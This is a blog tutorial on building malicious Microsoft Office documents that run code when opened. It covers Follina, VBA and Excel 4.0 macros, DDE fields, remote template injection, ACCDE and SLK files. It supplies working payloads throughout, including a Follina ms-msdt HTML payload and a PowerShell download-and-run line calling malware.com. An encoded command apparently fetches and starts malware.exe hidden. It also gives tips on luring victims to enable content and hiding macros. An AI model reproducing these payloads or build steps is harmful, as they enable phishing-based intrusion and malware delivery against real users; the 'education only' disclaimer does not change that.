---
title:  "Building Offensive Malicious Documents"
tags: Malicious-Document
---

Generally, the attacker will use the below techniques in leveraging Microsoft Office features and vulnerabilities:

1. Exploits
2. Macros
3. Remote template injection and many more...

In this post, we will learn various techniques on how to make malicious documents that can execute our malicious code. Of course, to make it simple we will just run the calc/notepad application to show our proof of concept is proven.

Why do security researchers always pop up a calc.exe when doing a Proof-of-Concept? Because it is simple and easy to pop up a calculator, rather than creating Powershell one-liner or shellcoding just to show your POC is proven. Hehe

You can always replace the calc.exe execution with any payload you want like Powershell reverse shell or mshta fileless or anything else that is suitable your appetite but popping up a calc.exe indicated that we can also execute anything we wanted like download and execute malware. Not just a calc.exe execution.

For example, malicious Powershell like below:
```
powershell IEX (New-Object Net.WebClient).DownloadString('https://malware.com/mini-reverse.ps1')
```

This is for education only whereby the purpose of this blog to understand how malicious documents were created by the attacker out there. Do with your own risk.

# Follina

We started with the latest and famous malicious document called Follina. Researchers have reproduced the zero-day with multiple versions of Microsoft Office and even publish their Follina malicious document generator on GitHub.

Here are the steps to build the docx:

Open Microsoft Word, create a dummy document. Insert an (OLE) object (as a Bitmap Image), save it in docx:
![image](https://user-images.githubusercontent.com/56353946/203402911-da9c543b-ffd6-4d3b-bf08-1ad2734b1158.png)

Unzip the docx file and edit `word/_rels/document.xml.rels` in the docx structure. Modify the XML tag `<Relationship` with attribute
`Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject` and `Target="embeddings/oleObject1.bin"` by changing the Target value and adding attribute `TargetMode` like below:
```
Target = "http://malware.domain/payload.html!" TargetMode = "External"
```
![image](https://user-images.githubusercontent.com/56353946/203403755-38afb536-d0b9-458f-b910-487de70ecc14.png)

Note the Id value (probably it is "rIdX" where X is random number. For example 10).

Edit `word/document.xml`. Search for the `<o:OLEObject` tag (with r:id="rd10") and change the attribute from `Type="Embed"` to `Type="Link"` and add the attribute `UpdateMode="OnCall"`.

![image](https://user-images.githubusercontent.com/56353946/203404734-5c0708d6-12fb-466e-b14e-6391eb092f72.png)

Serve the payload in html payload with the ms-msdt scheme at hxxp://malware[.]com/payload.html:
```
<!doctype html>
<html lang="en">
<head>
<title>
Good thing we disabled macros
</title>
</head>
<body>
<p>
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pellentesque egestas nulla in dignissim. Nam id mauris lorem. Nunc suscipit id magna id mollis. Pellentesque suscipit orci neque, at ornare sapien bibendum eu. Vestibulum malesuada nec sem quis finibus. Nam quis ligula et dui faucibus faucibus. In quis bibendum tortor.

Curabitur rutrum leo tortor, venenatis fermentum ex porttitor vitae. Proin eu imperdiet lorem, ac aliquet risus. Aenean eu sapien pharetra, imperdiet ipsum ut, semper diam. Nulla facilisi. Sed euismod tortor tortor, non eleifend nunc fermentum sit amet. Integer ligula ligula, congue at scelerisque sit amet, porttitor quis felis. Maecenas nec justo varius, semper turpis ut, gravida lorem. Proin arcu ligula, venenatis aliquam tristique ut, pretium quis velit.

Phasellus tristique orci enim, at accumsan velit interdum et. Aenean nec tristique ante, dignissim convallis ligula. Aenean quis felis dolor. In quis lectus massa. Pellentesque quis pretium massa. Vivamus facilisis ultricies massa ac commodo. Nam nec congue magna. Nullam laoreet justo ut vehicula lobortis.

Aliquam rutrum orci tortor, non porta odio feugiat eu. Vivamus nulla mauris, eleifend eu egestas scelerisque, vulputate id est. Proin rutrum nec metus convallis ornare. Ut ultricies ante et dictum imperdiet. Ut nisl magna, porttitor nec odio non, dapibus maximus nibh. Integer lorem felis, accumsan a dapibus hendrerit, maximus nec leo. Vestibulum porta, orci sed dignissim porta, sem justo porta odio, quis rutrum tortor arcu quis massa. Aenean eleifend nisi a quam faucibus, quis scelerisque lectus condimentum. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin non dui nec odio finibus molestie. Suspendisse id massa nunc. Sed ultricies et sapien vel fringilla.
</p>
<p>
Donec tincidunt ac justo et iaculis. Pellentesque lacinia, neque at consectetur porttitor, leo eros bibendum lorem, eu sollicitudin dolor urna pharetra augue. Pellentesque facilisis orci quis ante tempor, ac varius eros blandit. Nulla vulputate, purus eu consectetur ullamcorper, mauris nulla commodo dolor, in maximus purus mi eget purus. In mauris diam, imperdiet ac dignissim ut, mollis in purus. In congue volutpat tortor eu auctor. Nullam a eros lectus. Aenean porta semper quam ac lacinia. Curabitur interdum, nisl eu laoreet tempus, augue nisl volutpat odio, dictum aliquam massa orci sit amet magna.

Duis pulvinar vitae neque non placerat. Nullam at dui diam. In hac habitasse platea dictumst. Sed quis mattis libero. Nullam sit amet condimentum est. Nulla eget blandit elit. Nunc facilisis erat nec ligula ultrices, malesuada mollis ex porta. Phasellus iaculis lorem eu augue tincidunt, in ultrices massa suscipit. Donec gravida sapien ac dui interdum cursus. In finibus eu dolor sit amet porta. Sed ultrices nisl dui, at lacinia lectus porttitor ut.

Ut ac viverra risus. Suspendisse lacus nunc, porttitor facilisis mauris ut, ullamcorper gravida dolor. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vivamus sollicitudin, arcu id sagittis facilisis, turpis dolor eleifend massa, in maximus sapien dui et tortor. Quisque varius enim sed enim venenatis tempor. Praesent quis volutpat lorem. Pellentesque ac venenatis lacus, vitae commodo odio. Sed in metus at libero viverra mollis sed vitae nibh. Sed at semper lectus.
</p>
<p>
Proin a interdum justo. Duis sed dui vitae ex molestie egestas et tincidunt neque. Fusce lectus tellus, pharetra id ex at, consectetur hendrerit nibh. Nulla sit amet commodo risus. Nulla sed dapibus ante, sit amet fringilla dui. Nunc lectus mauris, porttitor quis eleifend nec, suscipit sit amet massa. Vivamus in lectus erat. Nulla facilisi. Vivamus sed massa quis arcu egestas vehicula. Nulla massa lorem, tincidunt sed feugiat quis, faucibus a risus. Sed viverra turpis sit amet metus iaculis finibus.

Morbi convallis fringilla tortor, at consequat purus vulputate sit amet. Morbi a ultricies risus, id maximus purus. Fusce aliquet tortor id ante ornare, non auctor tortor luctus. Quisque laoreet, sem id porttitor eleifend, eros eros suscipit lectus, id facilisis lorem lorem nec nibh. Nullam venenatis ornare ornare. Donec varius ex ac faucibus condimentum. Aenean ultricies vitae mauris cursus ornare. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas aliquet felis vel nulla auctor, ac tempor mi mattis. Nam accumsan nisi vulputate, vestibulum nisl at, gravida erat. Nam diam metus, tempor id sapien eu, porta luctus felis. Aliquam luctus vitae tortor quis consectetur. In rutrum neque sit amet fermentum rutrum. Sed a velit at metus pretium tincidunt tristique eget nibh. In ultricies, est ut varius pulvinar, magna purus tristique arcu, et laoreet purus elit ac lectus. Ut venenatis tempus magna, non varius augue consectetur ut.

Etiam elit risus, ullamcorper cursus nisl at, ultrices aliquet turpis. Maecenas vitae odio non dolor venenatis varius eu ac sem. Phasellus id tortor tellus. Ut vehicula, justo ac porta facilisis, mi sapien efficitur ipsum, sit fusce.
</p>
<script>
    location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'<base64 payload>'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";
</script>

</body>
</html>
```

# VBA Macro

In malware wild, macro malware is typically transmitted through phishing emails that contain malicious attachments. When the macros run, malware coded into the VBA will begin to infect all files that are opened using Microsoft Office. In our case, we will only execute a calc.exe app.

First, open Microsoft Office and then Press `Alt` + `F11` on your keyboard. The action will bring us to Macro Editor.
![image](https://user-images.githubusercontent.com/56353946/203387945-2cd55bd1-8227-4d1c-b1c1-154009b0d511.png)

On "Project (Document1)" path, click `ThisDocument`:
![image](https://user-images.githubusercontent.com/56353946/203388151-40943f11-58ed-4339-9e42-c64c2a56c47b.png)

Write our malicious macro code, for example:
```
Private Sub Document_Open()
Test
End Sub

Private Sub Test()
Shell ("cmd /c calc.exe")
End Sub
```
Save the document as `.doc` or `.docm` and run it!

For malicious execution POC, you might want to replace `calc.exe` with `powershell -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AOAAwAC4AMQAyADkAOgA4ADAAMAAwAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcALAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A`. The encoded base64 can be generate using this [recipe](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')).

Also, to lure user to click enable content, you might need some social engineering such as pictures or words that can manipulate user such as this picture:

![image](https://user-images.githubusercontent.com/56353946/226780899-43d02a21-e38d-4a5d-96f4-4f0d2c970a62.png)

Enabling the content upon opening the document will execute our code.
![image](https://user-images.githubusercontent.com/56353946/203389403-6939fd42-fdb2-443e-9514-df0b28870163.png)
![image](https://user-images.githubusercontent.com/56353946/203389593-84652bf9-9070-4422-9f4f-e41cb90a0032.png)


You can learn VBA coding from the resouces below:
1. https://www.trustedsec.com/blog/intro-to-macros-and-vba-for-script-kiddies/
2. https://www.trustedsec.com/blog/the-vba-language-for-script-kiddies/
3. https://www.trustedsec.com/blog/developing-with-vba-for-script-kiddies/

# OneNote

Refer this source: https://assume-breach.medium.com/home-grown-read-team-lets-make-some-onenote-phishing-attachments-a14f4ef6ccc4

![image](https://user-images.githubusercontent.com/56353946/226783305-41de9cc3-e2cb-4420-9ba8-8976e2c8b56d.png)


# DDE attack
This attack was commonly use by attacker out there, where once a victim was phished by clicking the "yes" button in the Warning message by Office, they can immidiately being compromised by the attacker. But, as far as I'm concerned. This vulnerability have been patched by Microsoft. So, the older version of Microsoft Office still vulnerable to this.

DDEAUTO, short for automatic dynamic data exchange, is a command you can put right inside the data of an Office file to get it to pull data out of another file. In our context DDE works by executing command, that will provide the data (data provider).

DDE attack can be done in Microsoft Word and Excel. Let's talk about DDE in Word.

## Microsoft Word
Go to `Insert` tab -> Click on `Quick Parts` -> Click on `Field`:
![image](https://user-images.githubusercontent.com/56353946/203390140-4f2420b5-fc30-460b-8a3a-f56093e7a6b9.png)

You can setup the `DDEAUTO` payload at footer of our document to avoid victim not notice any DDEAUTO mechanism.

Choose `= (Formula)` field names and click `OK` button:
![image](https://user-images.githubusercontent.com/56353946/203390318-197af9c3-9704-473d-8531-21106ae62ebd.png)

After that, you should see a Field inserted in the document with an error `!Unexpected End of Formula`.

Right-click the Field, and choose `Toggle Field Codes`:
![image](https://user-images.githubusercontent.com/56353946/203390602-2b00222b-db27-4af9-899c-f8f9960ec6d4.png)

The field code now should display `{= \* MERGEFORMAT}`:
![image](https://user-images.githubusercontent.com/56353946/203390694-bb4f9fc4-b46d-4695-865d-b7924f03b5d8.png)

Change the field code by manually typing the payload command you want to execute:
```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }
```

Save the document as `.docx`. Upon opening the document, they will be welcome with these two warning message. By clicking `Yes` on both warning box, our code will be execute.

![image](https://user-images.githubusercontent.com/56353946/203391031-0b051895-62be-4ebd-95c7-455461e4e208.png)
![image](https://user-images.githubusercontent.com/56353946/203391056-1eb60ba2-39da-468f-8f03-fc06ec7950c9.png)

Code executed!
![image](https://user-images.githubusercontent.com/56353946/203391160-ad2849e4-c754-4ae9-83f2-3c90c8069c42.png)

## Microsoft Excel
In Excel, we can embedded our DDE payload through the use of formulas feature.

Choose a box to put this payload `=cmd|'/c calc.exe'!'T81'` where T81 should be any table column number. Paste in the box and Excel will pop-up a warning. Just ignore it by click `No` for now:
![image](https://user-images.githubusercontent.com/56353946/203391392-113bc884-d39b-4460-b797-56682980018e.png)

Then, it will display this `#REF!` text in the box:
![image](https://user-images.githubusercontent.com/56353946/203391468-35ed54fd-534a-437e-a3d1-f60fdd9886db.png)

Click on the Yellow Warning icon, and choose `Ignore Error`:
![image](https://user-images.githubusercontent.com/56353946/203391561-56c74de5-7172-4b32-bcdf-2a7f4f9db0db.png)

Save the document as `.xlsx`.

Open the document and click `Enable Content`:
![image](https://user-images.githubusercontent.com/56353946/203391758-9c439a03-1ecb-4ceb-8b0f-778011888ea5.png)

Click `yes`, and our code will executed:
![image](https://user-images.githubusercontent.com/56353946/203391832-f491e15b-acfb-4df6-891f-2bf9a3686c5d.png)

# Template injection
## Word Template Injection
This part will shows us how to create a non-macro document that uses a template that contains VBA macros, which is loaded from a remote server when the document is executed.

When the maldoc is opened, it will attempt to retrieve and execute template document define at `word/_rels/settings.xml.rels`.

Let's first create a malicious template document. Then, we will create the second document which we will modify the `word/_rels/settings.xml` of the document which will be lead the document to retrieve and replace with our malicious template document. 

Assume that we going to use the document that we've have created in VBA Macro section above. I've added a line to pop-up a msgbox that tell us that our remote template injection is successful:
![image](https://user-images.githubusercontent.com/56353946/203392386-8f47d612-a283-4fe4-8b07-39197ea8203b.png)

Save the file as Macro-Enabled Template `.dotm` format.

Now, let's create a normal document using a free template from Microsoft Office. In my case, I'll using a free template named "Blue grey resume":
![image](https://user-images.githubusercontent.com/56353946/203392514-f3332b05-0e8b-42f4-979b-45bed36b62a4.png)

Then, save the document as `.docx`. Now we have the both documents that we need:
![image](https://user-images.githubusercontent.com/56353946/203392656-83ef7986-639a-4f6d-8ef2-2ce031c185d9.png)

Unzip the docx using decompress tool. In my case, I'll using 7zip. From here, we can start to see the files containing in the docx file:
![image](https://user-images.githubusercontent.com/56353946/203392752-9744e411-04f3-430e-a6e5-f10c27f69e52.png)

Navigate to `word/_rels/` folder, and we can start modifying the content of `setting.xml.rels`. Replace the content of the attribute `Target` in the file `setting.xml.rels` with your remote document serve in your server:
![image](https://user-images.githubusercontent.com/56353946/203392917-76519ec3-f599-4ef9-a376-74a46221f0f9.png)

Here my Kali box will serving the malicious template that we've created:
![image](https://user-images.githubusercontent.com/56353946/203393027-3663a445-8442-4bbd-8a0c-106d99ad8b56.png)

Replace the original link with our document link and save the file:
![image](https://user-images.githubusercontent.com/56353946/203393073-0cc9af37-634f-4d8e-a487-05b7039d39c3.png)

Now, compressed back all the files to a zip. Then change the `.zip` format to `.docx`:
![image](https://user-images.githubusercontent.com/56353946/203393164-ebaa4bcf-c3b6-4ee2-b089-3b863eb82078.png)
![image](https://user-images.githubusercontent.com/56353946/203393250-1f200351-6856-4c84-8471-3f005b12c729.png)

Now this document has contain the malicious remote template injection. Upon opening and Enabling Content of the document, the code will executed:
![image](https://user-images.githubusercontent.com/56353946/203393423-0460fab1-45de-48ea-8e25-3218a1a741ac.png)

## RTF Template injection
First, create a malicious `.dotm` document like we discussed in section Word Template injection above. Serve the file on the internet.

Then, create a microsoft word file and save it as `.rtf`:

![image](https://user-images.githubusercontent.com/56353946/203395416-92f0610a-41d4-44e7-8e67-df2eee27c08d.png)


After saving it, open the RTF file with text editor. Then put the below control word `template` in the RTF.
```
{\*\template http://malware.domain/malicious-template.dotm}
```

![image](https://user-images.githubusercontent.com/56353946/203395676-0d75923d-fade-4501-aa93-1070af618229.png)

Upon opening the RTF file, it will fetch the content (template) from malicious-template.dotm at hxxp://malware.domain, load the template and then make the malicious code execution:
![image](https://user-images.githubusercontent.com/56353946/203395073-ca1691d3-17d7-4327-8cff-bbddb449b744.png)

# Excel4Macro

Excel 4.0 macros which also known as XLM macros. Excel 4.0 macro can be difficult to analyse and detected by AV.

First step, create a new Excel workbook. Right click `Sheet1` at the bottom of the Excel and choose `Insert`:
![image](https://user-images.githubusercontent.com/56353946/203395962-f5edf494-a97b-44ed-b9aa-1fd97860aed2.png)

A windows box will pop-up that allow us to choose which object we want to insert. Select `MS Excel 4.0 Macro` and click OK:
![image](https://user-images.githubusercontent.com/56353946/203396087-fb2cbe7d-afe2-446f-ae02-d6e1fde94fa0.png)

From here, let's start to write our own macro. Click on any cell and type the formulas shown in below picture:
![image](https://user-images.githubusercontent.com/56353946/203396234-11ab9e7e-6285-4cd2-b3b2-7a6df7204571.png)

```
=EXEC("calc.exe")
=ALERT("Excel 4.0 Macro executed")
=RETURN()
```

On the name box at the top left, fill in `auto_open` to make our Excel 4.0 macro execute automatically when the workbook document is opened. It is similar to `Sub AutoOpen()` for VBA macros.

Also, we can hide our macro sheet by right click on the `Macro1` tab and select `hidden`:
![image](https://user-images.githubusercontent.com/56353946/203396444-dcdac9cb-5f2e-42ff-b003-ba831e866af1.png)

Our macro sheet will be gone from the sight:

![image](https://user-images.githubusercontent.com/56353946/203396509-9b121d35-fcf8-49b6-bf47-2f61d131ecca.png)

Save the malicious document either as .xls or .xlsm format. Once user open the workbook and click `Enable Content`, our XLM macro will be execute successfully:
![image](https://user-images.githubusercontent.com/56353946/203396656-322ac92c-5d12-4ef4-a962-7361da4df6bc.png)

# ACCDE executable
This technique was a rare case and I found that there is no public research yet related to this technique. I found this methodology was used by an attacker of my client during my analysis and investigation. 

Based on LifeWire A file with the ACCDE file extension is a Microsoft Access Execute Only Database file used to protect an ACCDB file. It replaces the MDE format (which secures an MDB file) used by older versions of MS Access.

The VBA code in an ACCDE file is saved in a way that prevents anyone from seeing or changing it. When you save a Microsoft Access database to the ACCDE format, you can also choose to protect custom database code as well as encrypting the entire file behind a password. So, long short story, an analyst cannot view the content of the VBA in .ACCDE file.

Let's try to create one. Open Microsoft Access and just use the blank one:
![image](https://user-images.githubusercontent.com/56353946/203397126-5319e2e1-113d-41ff-8f5a-6ebcc8a7800b.png)

Next, at the tab of Microsoft Office, navigate to `Create` tab and choose module to create our malicious VBA.
![image](https://user-images.githubusercontent.com/56353946/203397160-30a66de1-6739-4f8e-ab07-9a9d63029268.png)

In the `module1` opened by Access, here we can craft our vba payload in a function that we are about to create. In our case, pop-up a calc.exe.

Here we declare a public function popcalc() and the command that we want to execute:
```
Public Function Test()
Shell ("cmd /c calc.exe")
End Function
```
Then, save the Module with name Module1 or anything name that you want:
![image](https://user-images.githubusercontent.com/56353946/203397397-29906dbd-eef9-4bd6-9ee2-9b9e94e64f42.png)

The next part is to create a macro that will execute our `Module1` once the document is open. Go to `Create` tab and Choose `Macro`:
![image](https://user-images.githubusercontent.com/56353946/203397535-da4cc35b-25d1-489d-a00a-71cb1a305c95.png)

In the `Add New Action` box, choose `Run Code`:
![image](https://user-images.githubusercontent.com/56353946/203397613-76063874-44c0-465c-9f2c-50ff254432e5.png)

From here, type our Module1's function with `=` equal sign. You always need to type an equals sign (=) in front of the function name:
![image](https://user-images.githubusercontent.com/56353946/203397711-438a540e-4787-4574-a094-78142a2f27aa.png)

Then save it with name `autoexec` to automatically run our VBA when this document opened by victim. You can `CTRL+S` to save the Macro and rename it with `autoexec`:
![image](https://user-images.githubusercontent.com/56353946/203397962-24b93b32-fbe0-4ca3-9a1f-855fd6c46dff.png)

Then, save the Access database file (.accdb). Opening the file will execute the code:
![image](https://user-images.githubusercontent.com/56353946/203398103-bb5b9845-1f9f-4cbf-af5d-6db5b2f48166.png)

Let's hide both of the Macros and Modules by `Right-Click` on the both Object, and choose `Object Properties`. Then, check `hidden` checkbox. Click `Apply`. Now, both of it will be hidden from clear viewers:
![image](https://user-images.githubusercontent.com/56353946/203398220-e7722499-7da1-459c-9349-d30bb027d7af.png)

But if you want to view it just `Right-click` in the box, choose `Navigation Options`. In the `Display Options` part, check the `Show Hidden Objects` checkbox and click `OK`:
![image](https://user-images.githubusercontent.com/56353946/203398381-f9481530-8e59-4e74-a497-407302225af6.png)

Save it as `.accde` executable:
![image](https://user-images.githubusercontent.com/56353946/203398449-bc5f95d8-fbc6-4615-b628-805ad81c797a.png)

Executing our .accde file will pop-up with Microsoft Access Security Notice warning about the security concern. Just click Open:
![image](https://user-images.githubusercontent.com/56353946/203398601-73581bcd-64d0-4f1a-9632-4b137fd982be.png)

Code executed:

![image](https://user-images.githubusercontent.com/56353946/203398641-5fb239b4-b87e-4c90-bba3-0ae5ca77144b.png)

As you can see, we can't view our Module in the .accde executable:
![image](https://user-images.githubusercontent.com/56353946/203398765-730707fd-85c5-4430-a2d7-2b2c8d1845e7.png)

# SLK Excel
This study is based on [The MS Office Magic Show Stan Hegt Pieter Ceelen](https://www.youtube.com/watch?v=xY2DIRfqNvA) on SLK part. Do check out the video, it's awesome.

First, let's create the `.slk` file using text editor, put the payload below and save it as `filename.slk`:
```
ID;P
O;E
NN;NAuto_open;ER1C1;KOut Flank;F
C;X1;Y1;K0;EEXEC("calc.exe")
C;X1;Y2;K0;EHALT()
E
```

You can learn what are the meanings of every lines in the above code from the video by Stan I mentioned.

Upon opening the file, we need to click "Enable Content" button:
![image](https://user-images.githubusercontent.com/56353946/203399275-c72c8636-53ed-4523-98ac-4b77eee07712.png)

Then, code will executed:

![image](https://user-images.githubusercontent.com/56353946/203399369-371d350a-1d6a-488f-a365-9b5a491fb20f.png)

# CVE-2021-40444

Exploit chain:
1. Docx opened
2. Relationship stored in document.xml.rels points to malicious html
3. IE preview is launched to open the HTML link
4. JScript within the HTML contains an object pointing to a CAB file, and an iframe pointing to an INF file, prefixed with the ".cpl:" directive
5. The cab file is opened, the INF file stored in the %TEMP%\Low directory
6. Due to a Path traversal (ZipSlip) vulnerability in the CAB, it's possible to store the INF in %TEMP%
7. Then, the INF file is opened with the ".cpl:" directive, causing the side-loading of the INF file via rundll32 (if this is a DLL)

You can read and use one of the POC https://github.com/klezVirus/CVE-2021-40444.

# CVE-2017-0199

Based on Fireeye, this vulnerability allows a malicious actor to download and execute a Visual Basic script containing PowerShell commands when a user opens a document containing an embedded exploit. 

You can use https://github.com/bhdresh/CVE-2017-0199 exploit toolkit for CVE-2017-0199.

# CVE-2012-0158
Marta Janus from SecureList said that CVE-2012-0158 is a buffer overflow vulnerability in the ListView / TreeView ActiveX controls in the MSCOMCTL.OCX library. The malicious code can be triggered by a specially crafted DOC or RTF file for MS Office versions 2003, 2007 and 2010.

There is a Metasploit module for this vulnerability. Refer https://www.exploit-db.com/exploits/18780

# CVE-2017-8759
As describe by Rapid7, this exploit is a remote code execution vulnerability exists when Microsoft .NET Framework processes untrusted input. An attacker who successfully exploited this vulnerability in software using the .NET framework could take control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights. To exploit the vulnerability, an attacker would first need to convince the user to open a malicious document or application. The security update addresses the vulnerability by correcting how .NET validates untrusted input.

Refer this sample exploit https://github.com/Voulnet/CVE-2017-8759-Exploit-sample

# CVE-2017-11882
This exploit triggers WebClient service to start and execute remote file from attacker-controlled WebDav server. The reason why this approach might be handy is a limitation of executed command length. However with help of WebDav it is possible to launch arbitrary attacker-controlled executable on vulnerable machine. This script creates simple document with several OLE objects. These objects exploits CVE-2017-11882, which results in sequential command execution.

Refer https://github.com/embedi/CVE-2017-11882 and alternatively, we can use metasploit, https://www.rapid7.com/db/modules/exploit/windows/fileformat/office_ms17_11882.

# Others cool techniques 😋
1. [Phishing with MS Office by Red Teaming Experiments](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office)
2. [The MS Office Magic Show Stan Hegt Pieter Ceelen](https://www.youtube.com/watch?v=xY2DIRfqNvA)
  - VBA Stomping (remove vba code) but execute it with P-code
  - Remote template injection ft HTML Smuggling
  - .SLK Excel 
3. [Offensive Maldocs in 2020 Joe Leon & Matt Grandy](https://www.youtube.com/watch?v=RW5U9yxilf4)
  - XLM Macro
  - PPT Hover Over
  - Inline Shapes
4. [Office in Wonderland](https://www.youtube.com/watch?v=9ULzZA70Dzg&list=WL&index=4&t=1714s)
  - CVE-2019-0540
  - CVE-2019-0561
  - VBA Stomping
  - Hiding XLM macro with very hidden
  - SLK Excel
  - Excel 4.0 DCOM
5. https://github.com/decalage2/oletools/wiki/formats_vs_techniques
